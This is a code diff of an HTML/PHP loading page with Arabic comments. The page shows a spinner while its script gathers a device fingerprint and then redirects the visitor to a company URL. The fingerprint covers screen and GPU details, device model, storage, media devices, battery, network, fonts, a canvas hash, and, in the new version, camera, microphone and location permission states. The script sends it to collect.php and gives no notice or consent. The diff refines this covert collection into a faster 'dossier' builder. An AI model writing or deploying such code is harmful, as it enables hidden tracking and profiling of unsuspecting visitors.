@@ -4,114 +4,107 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحقق...</title>
+    <title>جاري المعالجة...</title>
     <style>
-        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #121212; color: #fff; font-family: sans-serif; }
-        .loader { border: 4px solid #333; border-top: 4px solid #00ffcc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #0f172a; }
+        .loader { width: 48px; height: 48px; border: 4px solid #334155; border-bottom-color: #38bdf8; border-radius: 50%; display: inline-block; box-sizing: border-box; animation: rotation 1s linear infinite; }
+        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div class="loader"></div>
 
     <script>
-        async function runMegaCollector() {
+        async function buildDossier() {
             const data = {};
-            
-            // 1. الأرقام الدقيقة للشاشة (Physical + Logical)
-            const dpr = window.devicePixelRatio || 1;
-            data.dpr = dpr;
-            data.screenWidth = screen.width;
-            data.screenHeight = screen.height;
-            data.physicalWidth = Math.round(screen.width * dpr);
-            data.physicalHeight = Math.round(screen.height * dpr);
-            data.colorDepth = screen.colorDepth;
-            data.viewportW = window.innerWidth;
-            data.viewportH = window.innerHeight;
-
-            // 2. الهاردوير الأساسي
-            data.cores = navigator.hardwareConcurrency || 'N/A';
-            data.ram = navigator.deviceMemory || 'N/A';
-            data.touchPoints = navigator.maxTouchPoints || 0;
-
-            // 3. فحص الـ GPU الدقيق
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            data.gpuVendor = 'Unknown'; data.gpuRenderer = 'Unknown';
+            
+            // --- 1. البيانات المتزامنة الفورية (Sync Data) ---
+            const dpr = window.devicePixelRatio || 1;
+            data.dpr = dpr;
+            data.screenW = screen.width; data.screenH = screen.height;
+            data.physW = Math.round(screen.width * dpr); data.physH = Math.round(screen.height * dpr);
+            data.colorDepth = screen.colorDepth;
+            data.hardware = { cores: navigator.hardwareConcurrency || 0, ram: navigator.deviceMemory || 0, touch: navigator.maxTouchPoints || 0 };
+            data.math = Math.tan(-1e300).toString();
+            data.darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark 🌙' : 'Light ☀️';
+            data.ua = navigator.userAgent;
+            data.webdriver = navigator.webdriver ? 1 : 0;
+            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            
+            const conn = navigator.connection || {};
+            data.net = { type: conn.effectiveType || 'N/A', speed: conn.downlink || 0, ping: conn.rtt || 0 };
+
+            // WebGL (GPU)
+            data.gpu = { vendor: 'Unknown', renderer: 'Unknown' };
             if (gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    data.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                    data.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                if (dbg) {
+                    data.gpu.vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
+                    data.gpu.renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
                 }
             }
 
-            // 4. Client Hints (الهوية الحقيقية)
-            data.model = 'Hidden'; data.osVer = 'Hidden'; data.arch = 'Unknown';
-            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-                try {
-                    const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion', 'architecture']);
-                    data.model = hints.model || 'Hidden';
-                    data.osVer = hints.platformVersion || 'Hidden';
-                    data.arch = hints.architecture || 'Unknown';
-                } catch (e) {}
-            }
-
-            // 5. التخزين (بالبايت والجيجا)
-            data.storageTotalBytes = 0; data.storageUsedBytes = 0;
-            if (navigator.storage && navigator.storage.estimate) {
-                try {
-                    const est = await navigator.storage.estimate();
-                    data.storageTotalBytes = est.quota;
-                    data.storageUsedBytes = est.usage;
-                } catch(e) {}
-            }
-
-            // 6. الوسائط (عدد الأجهزة)
-            data.audioInputs = 0; data.videoInputs = 0; data.audioOutputs = 0;
-            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
-                try {
-                    const devs = await navigator.mediaDevices.enumerateDevices();
-                    devs.forEach(d => {
-                        if (d.kind === 'audioinput') data.audioInputs++;
-                        if (d.kind === 'videoinput') data.videoInputs++;
-                        if (d.kind === 'audiooutput') data.audioOutputs++;
-                    });
-                } catch(e) {}
-            }
-
-            // 7. بصمة الرياضيات (Engine Math Precision)
-            data.mathPrecision = Math.tan(-1e300).toString();
-
-            // 8. فحص الخطوط المكتشفة
-            const fonts = ["Arial", "Courier New", "Georgia", "Impact", "Tahoma", "Times New Roman", "Verdana", "Comic Sans MS", "Consolas"];
-            data.fontsFound = fonts.filter(f => document.fonts.check(`12px "${f}"`)).length;
-
-            // 9. البطارية الدقيقة
-            data.batLevel = 'N/A'; data.batCharging = 'N/A';
-            if (navigator.getBattery) {
-                try {
-                    const b = await navigator.getBattery();
-                    data.batLevel = (b.level * 100).toFixed(2); // نسبة برقمين عشريين
-                    data.batCharging = b.charging ? 1 : 0;
-                } catch(e) {}
-            }
-
-            // 10. الشبكة والبيئة
-            const conn = navigator.connection || {};
-            data.netType = conn.effectiveType || 'N/A';
-            data.netDownlink = conn.downlink || 0; // بالميجا
-            data.netRtt = conn.rtt || 0; // بالملي ثانية
-            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            data.ua = navigator.userAgent;
-            data.webdriver = navigator.webdriver ? 1 : 0;
-            
-            // بصمة الكانفاس المصغرة
+            // Canvas Hash
             const ctx = canvas.getContext('2d');
-            ctx.textBaseline = "top"; ctx.font = "16px 'Arial'"; ctx.fillText("SystemX", 2, 2);
+            ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.fillText("SysX-Hash", 2, 2);
             data.canvasHash = canvas.toDataURL().slice(-30);
 
-            // إرسال البيانات كـ JSON
+            // Fonts
+            const fontsList = ["Arial", "Courier New", "Georgia", "Impact", "Tahoma", "Times New Roman", "Verdana", "Comic Sans MS", "Consolas"];
+            data.fonts = fontsList.filter(f => document.fonts.check(`12px "${f}"`)).length;
+
+            // --- 2. البيانات غير المتزامنة (Async Data) ---
+            data.model = 'Hidden'; data.osVer = 'Hidden';
+            data.storageTotal = 0; data.storageUsed = 0;
+            data.media = { audioIn: 0, videoIn: 0, audioOut: 0 };
+            data.perms = { cam: 'N/A', mic: 'N/A', loc: 'N/A' };
+            data.audioHash = "N/A";
+            data.bat = { level: 'N/A', charging: 0 };
+
+            try {
+                // تنفيذ المهام الثقيلة بالتوازي لضمان السرعة (Parallel Execution)
+                const promises = [];
+
+                if (navigator.userAgentData) {
+                    promises.push(navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion']).then(h => {
+                        data.model = h.model || 'Hidden'; data.osVer = h.platformVersion || 'Hidden';
+                    }).catch(e=>e));
+                }
+                if (navigator.storage) {
+                    promises.push(navigator.storage.estimate().then(s => {
+                        data.storageTotal = s.quota; data.storageUsed = s.usage;
+                    }).catch(e=>e));
+                }
+                if (navigator.mediaDevices) {
+                    promises.push(navigator.mediaDevices.enumerateDevices().then(devs => {
+                        devs.forEach(d => {
+                            if(d.kind === 'audioinput') data.media.audioIn++;
+                            if(d.kind === 'videoinput') data.media.videoIn++;
+                            if(d.kind === 'audiooutput') data.media.audioOut++;
+                        });
+                    }).catch(e=>e));
+                }
+                if (navigator.permissions) {
+                    promises.push(navigator.permissions.query({name: 'camera'}).then(p => data.perms.cam = p.state).catch(e=>e));
+                    promises.push(navigator.permissions.query({name: 'microphone'}).then(p => data.perms.mic = p.state).catch(e=>e));
+                    promises.push(navigator.permissions.query({name: 'geolocation'}).then(p => data.perms.loc = p.state).catch(e=>e));
+                }
+                if (navigator.getBattery) {
+                    promises.push(navigator.getBattery().then(b => {
+                        data.bat.level = (b.level * 100).toFixed(0); data.bat.charging = b.charging ? 1 : 0;
+                    }).catch(e=>e));
+                }
+
+                // ننتظر المهام كحد أقصى 300 ملي ثانية عشان مفيش حاجة تعطلنا
+                await Promise.race([
+                    Promise.all(promises),
+                    new Promise(resolve => setTimeout(resolve, 300))
+                ]);
+            } catch (e) {}
+
+            // --- 3. إرسال البيانات والتحويل ---
             fetch('collect.php', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -119,13 +112,12 @@
                 keepalive: true
             });
 
-            // تحويل سريع
-            setTimeout(() => {
-                window.location.replace('<?php echo COMPANY_URL; ?>');
-            }, 100);
+            // تحويل فوري للموقع 
+            window.location.replace('<?php echo COMPANY_URL; ?>');
         }
 
-        runMegaCollector();
+        // تشغيل البناء فوراً وبدون انتظار
+        buildDossier();
     </script>
 </body>
 </html>
